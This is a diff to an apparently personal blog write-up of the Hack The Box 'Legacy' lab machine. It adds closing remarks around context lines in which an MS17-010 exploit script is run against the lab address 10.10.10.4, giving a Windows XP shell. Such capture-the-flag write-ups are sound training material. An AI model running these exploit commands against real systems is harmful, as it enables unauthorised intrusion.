@@ -248,6 +248,9 @@ created virtual environment CPython2.7.18.final.0-64 in 2775ms
   (venv) ┌─[✗]─[george@parrot]─[~/HTB/boxes/legacy]
   └──╼ $ pip2 install impacket==0.9.22
 ```
+
+Finally I got it working and the exploit is a success.
+
 ```c
 (venv) ┌─[george@parrot]─[~/HTB/boxes/legacy]
 └──╼ $ python2.7 MS17-010/send_and_execute.py 10.10.10.4 george.exe
@@ -293,3 +296,6 @@ Microsoft Windows XP [Version 5.1.2600]
 
 C:\WINDOWS\system32>
 ```
+And thats the box. Thank you all for taking your time to read my blog post, stay tuned for the next!
+
+Happy hacking!
